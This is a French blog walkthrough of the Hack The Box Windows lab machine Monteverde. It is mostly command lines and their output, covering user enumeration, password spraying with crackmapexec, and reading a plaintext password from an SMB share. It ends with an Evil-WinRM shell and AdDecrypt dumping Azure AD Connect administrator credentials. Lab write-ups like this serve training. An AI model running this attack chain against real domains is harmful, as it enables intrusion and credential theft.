<!DOCTYPE html>
<html lang="fr">
    
    


    <head>
    <link href="https://gmpg.org/xfn/11" rel="profile">
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Cache-Control" content="public" />
<!-- Enable responsiveness on mobile devices -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.78.2" />

    
    
    

<title>Medium - Monteverde • LOLOLEKIK</title>


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Medium - Monteverde"/>
<meta name="twitter:description" content="Résolution de la box Monteverde
Introduction La box Monteverde de Hack The Box est une box Windows de difficulté &ldquo;Medium&rdquo;.
Foothold Enumération On commence par faire un nmap sur la machine distante
┌──(lololekik㉿Ashitaka)-[~] └─$ nmap -p- -A -Pn monteverde.htb Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-01 17:41 CET Nmap scan report for monteverde.htb (10."/>

<meta property="og:title" content="Medium - Monteverde" />
<meta property="og:description" content="Résolution de la box Monteverde
Introduction La box Monteverde de Hack The Box est une box Windows de difficulté &ldquo;Medium&rdquo;.
Foothold Enumération On commence par faire un nmap sur la machine distante
┌──(lololekik㉿Ashitaka)-[~] └─$ nmap -p- -A -Pn monteverde.htb Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-01 17:41 CET Nmap scan report for monteverde.htb (10." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://lololekik.com/hack-the-box/monteverde/" />
<meta property="og:site_name" content="OffSec &amp; CO" />


    



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/qtcreator_dark.min.css">







<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">


<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">


    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <!-- Icons -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
    <link rel="shortcut icon" href="/favicon.png">
    
    <link rel="stylesheet" href="/css/custom.css">





</head>


    <body class=" ">
    
<div class="sidebar">
  <div class="container ">
    <div class="sidebar-about">
      <span class="site__title">
        <a href="http://lololekik.com/">LOLOLEKIK</a>
      </span>
      
        
        
        
        <div class="author-image">
          <img src="http://lololekik.com/img/author.jpg" alt="Author Image" class="img--circle img--headshot element--center">
        </div>
        
      
      
      <p class="site__description">
         OffSec &amp; Co 
      </p>
    </div>
    <div class="collapsible-menu">
      <input type="checkbox" id="menuToggle">
      <label for="menuToggle">LOLOLEKIK</label>
      <div class="menu-content">
        <div>
	<ul class="sidebar-nav">
		 
		 
			 
				<li>
					<a href="/cuisine/">
						<span>Cuisine</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/exploit/">
						<span>Exploit</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/network/">
						<span>Network</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/writeups/">
						<span>WriteUps</span>
					</a>
				</li>
			 
		 
			 
				<li>
					<a href="/hack-the-box/">
						<span>HackTheBox</span>
					</a>
				</li>
			 
		
	</ul>
</div>

        <section class="social">
	
	
	
	<a href="https://github.com/LOLOLEKIK" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	
	
	
	<a href="https://root-me.org/lololekik" target="blank" class="linklogo"><div class="rootme_logo logohover"> </div></a>
	
	
	<a href="https://hackthebox.eu/home/users/profile/202145" target="blank" class="linklogo"><div class="hackthebox_logo logohover"> </div></a>
	
	
	<a href="https://linkedin.com/in/loris-thiebaut-8b4b85197" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
	
	
	
	
	
	
	
	
	
	<a href="mailto:loris.thiebaut@gmail.com" rel="me"><i class="fas fa-at fa-lg" aria-hidden="true"></i></a>
	
</section>

      </div>
    </div>
    

<div class="builtwith">
Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
</div>


  </div>
</div>

        <div class="content container">
            
    
<article>
  <header>
    <h1>Medium - Monteverde</h1>
    
    
<div class="post__meta">
    
    
    
    
      
      
          in
          
          
              <a class="badge badge-category" href="/categories/hack-the-box">HACK THE BOX</a>
              
          
      
    
    
    
      
      
          <br/>
           <i class="fas fa-tags"></i>
          
          <a class="badge badge-tag" href="/tags/pentest">pentest</a>
           
      
          <a class="badge badge-tag" href="/tags/windows">windows</a>
           
      
          <a class="badge badge-tag" href="/tags/medium">medium</a>
           
      
          <a class="badge badge-tag" href="/tags/azure">azure</a>
           
      
          <a class="badge badge-tag" href="/tags/smb">smb</a>
           
      
          <a class="badge badge-tag" href="/tags/ad">ad</a>
          
      
    
    
    <br/>
    <i class="fas fa-clock"></i> 6 min read
</div>


  </header>
  
  
  <div class="post">
    <p><strong>Résolution de la box Monteverde</strong></p>
<h1 id="introduction">Introduction</h1>
<p>La box <strong>Monteverde</strong> de Hack The Box est une box Windows de difficulté &ldquo;Medium&rdquo;.</p>



  <img src="/img/htb/monteverde/resume.png" alt="Résumé de la machine Monteverde" class="imageformat"/>

<h1 id="foothold">Foothold</h1>
<h2 id="enumération">Enumération</h2>
<p>On commence par faire un nmap sur la machine distante</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ nmap -p- -A -Pn monteverde.htb
Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times will be slower.
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-02-01 17:41 CET
Nmap scan report <span style="color:#66d9ef">for</span> monteverde.htb <span style="color:#f92672">(</span>10.10.10.172<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.034s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65517</span> filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2021-02-01 16:53:02Z<span style="color:#f92672">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m19s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-02-01T16:53:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 223.86 seconds

</code></pre></div><p>Avec enum4linux on trouve une liste d&rsquo;utilisateur qu&rsquo;on stock.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">Use of uninitialized value $global_workgroup in concatenation <span style="color:#f92672">(</span>.<span style="color:#f92672">)</span> or string at ./enum4linux.pl line 866.
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account <span style="color:#66d9ef">for</span> the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>    Desc: Built-in account <span style="color:#66d9ef">for</span> guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O<span style="color:#e6db74">&#39;Leary       Desc: (null)
</span><span style="color:#e6db74">index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
</span><span style="color:#e6db74">index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
</span><span style="color:#e6db74">index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
</span><span style="color:#e6db74">index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
</span><span style="color:#e6db74">index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/monteverde]
</span><span style="color:#e6db74">└─$ cat user | awk -F Account: &#39;</span><span style="color:#f92672">{</span>print $2<span style="color:#f92672">}</span><span style="color:#e6db74">&#39; | awk &#39;</span><span style="color:#f92672">{</span>print $1<span style="color:#f92672">}</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">AAD_987d7f2f57d2
</span><span style="color:#e6db74">dgalanos
</span><span style="color:#e6db74">Guest
</span><span style="color:#e6db74">mhope
</span><span style="color:#e6db74">roleary
</span><span style="color:#e6db74">SABatchJobs
</span><span style="color:#e6db74">smorgan
</span><span style="color:#e6db74">svc-ata
</span><span style="color:#e6db74">svc-bexec
</span><span style="color:#e6db74">svc-netapp
</span><span style="color:#e6db74">                                                                                                                                                                                                                                           
</span><span style="color:#e6db74">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/monteverde]
</span><span style="color:#e6db74">└─$ cat user | awk -F Account: &#39;</span><span style="color:#f92672">{</span>print $2<span style="color:#f92672">}</span><span style="color:#e6db74">&#39; | awk &#39;</span><span style="color:#f92672">{</span>print $1<span style="color:#f92672">}</span><span style="color:#960050;background-color:#1e0010">&#39;</span> &gt; user.txt

</code></pre></div><p>On créé une wordlist pour tenter de trouver un couple user/password</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/monteverde<span style="color:#f92672">]</span>
└─$ cat user.txt &gt; bruteforce.txt                                        
                                                                                                                                                                                                                                           
┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/monteverde<span style="color:#f92672">]</span>
└─$ cat /usr/share/seclists/Passwords/darkweb2017-top100.txt &gt;&gt; bruteforce.txt 

</code></pre></div><h2 id="exploit">Exploit</h2>
<p>Avec crackmapexec on eassie de trouver un couple username/password valide</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/monteverde<span style="color:#f92672">]</span>
└─$ sudo crackmapexec smb monteverde.htb -d megabank -u user.txt -p bruteforce.txt
SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:MONTEVERDE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:megabank<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank<span style="color:#ae81ff">\S</span>ABatchJobs: STATUS_LOGON_FAILURE 
SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank<span style="color:#ae81ff">\S</span>ABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank<span style="color:#ae81ff">\S</span>ABatchJobs:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank<span style="color:#ae81ff">\S</span>ABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank<span style="color:#ae81ff">\S</span>ABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank<span style="color:#ae81ff">\S</span>ABatchJobs:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    <span style="color:#ae81ff">445</span>    MONTEVERDE       <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> megabank<span style="color:#ae81ff">\S</span>ABatchJobs:SABatchJobs 
</code></pre></div><p>On trouve SABatchJob:SABatchjobs</p>
<h1 id="user">User</h1>
<h2 id="enumération-1">Enumération</h2>
<p>On énumère les fichiers présents dans SMB et on cherche des fichiers intéressants.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/monteverde<span style="color:#f92672">]</span>
└─$ smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A<span style="color:#e6db74">&#39;(xlsx|docx|txt|xml)&#39;</span> -R
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.172:445        Name: monteverde.htb                                    
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting search <span style="color:#66d9ef">for</span> files matching <span style="color:#e6db74">&#39;(xlsx|docx|txt|xml)&#39;</span> on share azure_uploads.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting search <span style="color:#66d9ef">for</span> files matching <span style="color:#e6db74">&#39;(xlsx|docx|txt|xml)&#39;</span> on share IPC$.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting search <span style="color:#66d9ef">for</span> files matching <span style="color:#e6db74">&#39;(xlsx|docx|txt|xml)&#39;</span> on share NETLOGON.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting search <span style="color:#66d9ef">for</span> files matching <span style="color:#e6db74">&#39;(xlsx|docx|txt|xml)&#39;</span> on share SYSVOL.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting search <span style="color:#66d9ef">for</span> files matching <span style="color:#e6db74">&#39;(xlsx|docx|txt|xml)&#39;</span> on share users$.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Match found! Downloading: users$<span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\a</span>zure.xml
</code></pre></div><p>On a trouvé un fichier azure.xml. A l&rsquo;intérieur se trouve un mot de passe.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">┌──(lololekik㉿Ashitaka)-[~/Documents/htb/monteverde]
└─$ cat 10.10.10.172-users_mhope_azure.xml              
��<span style="color:#f92672">&lt;Objs</span> <span style="color:#a6e22e">Version=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;Obj</span> <span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;TN</span> <span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
      <span style="color:#f92672">&lt;T&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span style="color:#f92672">&lt;/T&gt;</span>
      <span style="color:#f92672">&lt;T&gt;</span>System.Object<span style="color:#f92672">&lt;/T&gt;</span>
    <span style="color:#f92672">&lt;/TN&gt;</span>
    <span style="color:#f92672">&lt;ToString&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span style="color:#f92672">&lt;/ToString&gt;</span>
    <span style="color:#f92672">&lt;Props&gt;</span>
      <span style="color:#f92672">&lt;DT</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;StartDate&#34;</span><span style="color:#f92672">&gt;</span>2020-01-03T05:35:00.7562298-08:00<span style="color:#f92672">&lt;/DT&gt;</span>
      <span style="color:#f92672">&lt;DT</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;EndDate&#34;</span><span style="color:#f92672">&gt;</span>2054-01-03T05:35:00.7562298-08:00<span style="color:#f92672">&lt;/DT&gt;</span>
      <span style="color:#f92672">&lt;G</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;KeyId&#34;</span><span style="color:#f92672">&gt;</span>00000000-0000-0000-0000-000000000000<span style="color:#f92672">&lt;/G&gt;</span>
      <span style="color:#f92672">&lt;S</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;Password&#34;</span><span style="color:#f92672">&gt;</span>4n0therD4y@n0th3r$<span style="color:#f92672">&lt;/S&gt;</span>
    <span style="color:#f92672">&lt;/Props&gt;</span>
  <span style="color:#f92672">&lt;/Obj&gt;</span>
<span style="color:#f92672">&lt;/Objs&gt;</span>  
</code></pre></div><h2 id="exploit-1">Exploit</h2>
<p>Ce fichier vient du répertoire de mhope alors on essaie de se connecter à mhope avec le mot de passe 4n0therD4y@n0th3r$</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/monteverde<span style="color:#f92672">]</span>
└─$ ~/tools/evil-winrm/evil-winrm.rb -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
megabank<span style="color:#ae81ff">\m</span>hope
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\D</span>ocuments&gt; 
</code></pre></div><h1 id="administrateur">Administrateur</h1>
<h2 id="enumération-2">Enumération</h2>
<p>On voit qu&rsquo;on fait partie du groupe &ldquo;Azure Admins&rdquo;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogram Files&gt; whoami /all

USER INFORMATION
----------------

User Name      SID
<span style="color:#f92672">==============</span> <span style="color:#f92672">============================================</span>
megabank<span style="color:#ae81ff">\m</span>hope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
<span style="color:#f92672">===========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">============================================</span> <span style="color:#f92672">==================================================</span>
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN<span style="color:#ae81ff">\R</span>emote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN<span style="color:#ae81ff">\U</span>sers                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK<span style="color:#ae81ff">\A</span>zure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label<span style="color:#ae81ff">\M</span>edium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
<span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================</span> <span style="color:#f92672">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support <span style="color:#66d9ef">for</span> Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogram Files&gt; 
</code></pre></div><p>En faisant quelque recherches sur internet on voit qu&rsquo;il y a plusieurs facon de s&rsquo;authentifier avec notre Active directory sur Azure. On va se servir de l&rsquo;un de ces méthodes pour demander le Hash dans la base de donnée et le déchiffrer. Pour cela on utilise le code ici : <a href="https://github.com/VbScrub/AdSyncDecrypt/releases">https://github.com/VbScrub/AdSyncDecrypt/releases</a></p>
<h2 id="exploit-2">Exploit</h2>
<p>On télécharge le fichier.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\D</span>ocuments&gt; upload AdDecrypt.exe C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\D</span>ocuments
Info: Uploading AdDecrypt.exe to C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\D</span>ocuments

                                                             
Data: <span style="color:#ae81ff">19796</span> bytes of <span style="color:#ae81ff">19796</span> bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\D</span>ocuments&gt; 
</code></pre></div><p>On lance le programme.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\M</span>icrosoft Azure AD Sync<span style="color:#ae81ff">\B</span>in&gt; uploads mcrypt.dll ./mcrypt.dll
Info: Uploading mcrypt.dll to C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\M</span>icrosoft Azure AD Sync<span style="color:#ae81ff">\B</span>in<span style="color:#ae81ff">\.</span>/mcrypt.dll

                                                             
Data: <span style="color:#ae81ff">445664</span> bytes of <span style="color:#ae81ff">445664</span> bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\M</span>icrosoft Azure AD Sync<span style="color:#ae81ff">\B</span>in&gt; C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>hope<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\A</span>dDecrypt.exe -FullSQL

<span style="color:#f92672">======================</span>
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
<span style="color:#f92672">======================</span>

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL

*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\M</span>icrosoft Azure AD Sync<span style="color:#ae81ff">\B</span>in&gt; 
</code></pre></div><p>On peut se connecter en tant qu&rsquo;admin.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/monteverde<span style="color:#f92672">]</span>
└─$ ~/tools/evil-winrm/evil-winrm.rb -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!   


Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
megabank<span style="color:#ae81ff">\a</span>dministrator
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; hostname
MONTEVERDE
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; 
</code></pre></div>
  </div>
  

<div class="navigation navigation-single">
    
    <a href="/hack-the-box/obscurity/" class="navigation-prev">
      <i aria-hidden="true" class="fa fa-chevron-left"></i>
      <span class="navigation-tittle">Medium - Obscurity</span>
    </a>
    
    
    <a href="/hack-the-box/mango/" class="navigation-next">
      <span class="navigation-tittle">Medium - Mango</span>
      <i aria-hidden="true" class="fa fa-chevron-right"></i>
    </a>
    
</div>


  

  
    


</article>


        </div>
        
    

<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>


    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
        
    <script type="text/javascript">
        
        hljs.initHighlightingOnLoad();
    </script>
    



    



    </body>
</html>
